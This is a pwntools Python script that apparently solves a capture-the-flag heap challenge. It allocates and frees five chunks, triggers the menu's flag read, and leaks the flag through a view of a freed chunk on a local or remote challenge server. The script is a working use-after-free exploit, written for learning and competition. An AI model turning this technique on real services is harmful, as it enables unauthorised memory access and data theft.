#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 4267"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def alloc(idx, sz, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(sz).encode())
    io.sendlineafter(b"Content: ", content)


def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())


def view(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Data: ")
    return io.recvline(keepends=False)


def read_flag():
    io.sendlineafter(b"> ", b"4")


env = {}
io = start()

for i in range(5):
    alloc(i + 1, 0x70, b"A")

for i in range(5):
    free(i + 1)

read_flag()

flag = view(1)
print(flag)

io.interactive()
